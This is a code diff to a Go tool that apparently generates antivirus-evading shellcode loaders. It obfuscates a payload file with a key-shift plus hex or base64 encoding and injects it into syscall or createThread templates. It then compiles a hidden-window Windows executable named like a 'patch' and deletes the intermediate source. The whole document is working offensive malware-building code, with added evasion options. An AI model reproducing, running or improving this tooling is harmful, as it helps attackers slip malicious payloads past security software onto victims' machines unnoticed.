@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"io/ioutil"
 	"math/rand"
@@ -20,25 +21,47 @@ var (
 	gd           string
 	bbdataName   string
 	shellCodeHex string
-	bdata        string
+	shellcodeStr string
 )
 
 var path = "payload.bin"
 var tmplMap = make(map[string]string)
+var encodeMap = make(map[string]string)
 
 var path1 string
 var hide1 string
 var gostrip1 string
 var isRm1 string
 var tpl string
+var encode string
 var hide = true
 var gostrip bool
 var isRm = true
 var tmplVal = "syscall"
+var encodeVal = "hex"
 
 const tmplHelp = `
 1. syscall
 2. createThread
+`
+
+const encodeHelp = `
+1. hex
+2. base64
+`
+
+var decodeMethod = `
+func $getDeCode(string2 string) []byte {
+	ss, _ := $encode$.DecodeString(string2)
+	string2 = string(ss)
+	var code []byte
+	bydata := []byte(string2)
+	for i := 0; i < len(bydata); i++ {
+		code = append(code, bydata[i]-$keyName[0]+$keyName[1])
+	}
+	ssb, _ := $encode$.DecodeString(string(code))
+	return ssb
+}
 `
 
 func init() {
@@ -61,6 +84,9 @@ func init() {
 
 	tmplMap["1"] = "syscall"
 	tmplMap["2"] = "createThread"
+
+	encodeMap["1"] = "hex"
+	encodeMap["2"] = "base64"
 }
 
 func getKey() []byte {
@@ -70,7 +96,7 @@ func getKey() []byte {
 }
 
 func randString(l int) string {
-	str := "abcdefghijklmnopqrstuvwxyz_"
+	str := "abcdefghijklmnopqrstuvwxyz_ASDFGJHKLIUYTREWCVBMNKLOIPZXAQ"
 	bytes := []byte(str)
 	result := []byte{}
 	x := time.Now().UnixNano() * 6
@@ -85,7 +111,7 @@ func randString(l int) string {
 	return ddd
 }
 
-func getEnCode(data []byte) string {
+func getBase64EnCode(data []byte) string {
 	bdata1 := base64.StdEncoding.EncodeToString(data)
 	bydata1 := []byte(bdata1)
 	var shellcode []byte
@@ -96,9 +122,25 @@ func getEnCode(data []byte) string {
 	return base64.StdEncoding.EncodeToString(shellcode)
 }
 
+func getHexEnCode(data []byte) string {
+	var shellcode []byte
+	for i := 0; i < len(data); i++ {
+		shellcode = append(shellcode, data[i]+key[0]-key[1])
+	}
+	return hex.EncodeToString(shellcode)
+}
+
 func gen(code *string) {
+
+	*code = strings.ReplaceAll(*code, "$method$", decodeMethod)
+
+	if encodeVal == "hex" {
+		*code = strings.ReplaceAll(*code, "\"encoding/base64\"", "")
+	} else {
+		*code = strings.ReplaceAll(*code, "\"encoding/hex\"", "")
+	}
 	//payload
-	*code = strings.ReplaceAll(*code, "$bdata", bdata)
+	*code = strings.ReplaceAll(*code, "$bdata", shellcodeStr)
 	//payload名
 	*code = strings.ReplaceAll(*code, "$bbdata", bbdataName)
 	*code = strings.ReplaceAll(*code, "$keyName", keyName)
@@ -129,30 +171,41 @@ func main() {
 		if strings.TrimSpace(path1) != "" {
 			path = path1
 		}
-		fmt.Println("[*]请输入免杀方式 [1]")
+		fmt.Println("[*]请选择免杀方式 [默认1]")
 		fmt.Println(tmplHelp)
 		fmt.Scanln(&tpl)
 		if strings.TrimSpace(tmplMap[tpl]) != "" {
 			tmplVal = tmplMap[tpl]
 		}
 
-		fmt.Println("[*]是否隐藏窗口 [Y/n]")
+		fmt.Println("[*]请选择编码方式 [默认1]")
+		fmt.Println(encodeHelp)
+		fmt.Scanln(&encode)
+		if strings.TrimSpace(encodeMap[encode]) != "" {
+			encodeVal = encodeMap[encode]
+		}
+
+		fmt.Println("[*]是否隐藏窗口? [Y/n]")
 		fmt.Scanln(&hide1)
 		if hide1 == "n" {
 			hide = false
 		}
 
-		fmt.Println("[*]是否去除golang特征 [y/N]")
-		fmt.Scanln(&gostrip1)
-		if gostrip1 == "y" {
-			gostrip = true
-		}
+		/*		fmt.Println("[*]是否去除golang特征? [y/N]")
+				fmt.Scanln(&gostrip1)
+				if gostrip1 == "y" {
+					gostrip = true
+				}*/
 
-		fmt.Println("[*]是否删除生成shellcode [Y/n]")
+		fmt.Println("[*]是否删除生成shellcode? [Y/n]")
 		fmt.Scanln(&isRm1)
 		if isRm1 == "n" {
 			isRm = false
 		}
+
+		fmt.Println("===============================")
+
+		time.Sleep(1 * time.Second)
 
 	}
 	sc, err := ioutil.ReadFile(path)
@@ -161,15 +214,26 @@ func main() {
 		return
 	}
 
-	bdata = getEnCode(sc)
+	//根据编码生成shellcode
+	if encodeVal == "hex" {
+		shellcodeStr = getHexEnCode(sc)
+		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "hex")
+	} else {
+		shellcodeStr = getBase64EnCode(sc)
+		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "base64.StdEncoding")
+	}
+
 	fmt.Println("[+]获取payload", "---->", path)
 	//fmt.Println(bdata)
+	time.Sleep(1 * time.Second)
+	fmt.Println("[*]编码方式", "---->", encodeVal)
 	time.Sleep(1 * time.Second)
 	//ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)
 	fmt.Println("[*]解析shellcode模板", "---->", tmplVal)
 	time.Sleep(1 * time.Second)
 	//tmpl, _ := ioutil.ReadFile("./syscal")
 	tmpl, _ := ioutil.ReadFile("template/" + tmplVal)
+	fmt.Println(tmpl)
 	code := string(tmpl)
 	fmt.Println("[*]生成shellcode", "---->shellcode.go")
 	time.Sleep(1 * time.Second)
@@ -184,20 +248,21 @@ func main() {
 	//隐藏窗口，如有需要自行替换
 	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
 	//CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go
-	//outFile :="patch"+string(time.Now().Format("2006-01-02"))+".exe"
-	outFile := "patch.exe"
+	outFile := "patch" + string(time.Now().Format("200612150405")) + ".exe"
+	//outFile := "patch.exe"
 	var cmd exec.Cmd
 	if hide {
-		cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+outFile)
+		//cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+outFile)
+		cmd = *exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o "+outFile+" ./shellcode.go")
 	} else {
-		cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-s -w", "shellcode.go", "-o game"+outFile)
+		cmd = *exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o "+outFile+" ./shellcode.go")
 	}
 	//阻塞至等待命令执行完成
 	err1 := cmd.Run()
 	if err1 != nil {
 		panic(err1)
 	}
-	fmt.Println("[+]生成" + outFile)
+	fmt.Println("[+]生成文件" + outFile)
 	if isRm {
 		os.Remove("shellcode.go")
 	}
